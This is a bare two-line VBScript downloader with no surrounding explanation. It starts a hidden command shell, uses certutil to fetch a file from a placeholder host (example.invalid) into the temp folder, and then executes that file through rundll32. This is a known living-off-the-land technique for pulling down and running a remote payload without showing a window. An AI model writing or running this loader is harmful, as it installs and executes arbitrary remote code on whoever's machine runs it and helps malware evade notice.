Set s=CreateObject("WScript.Shell")
s.Run "cmd /c certutil -urlcache -split -f https://example.invalid/object.txt %temp%\object.txt && rundll32.exe %temp%\object.txt,Run",0,True
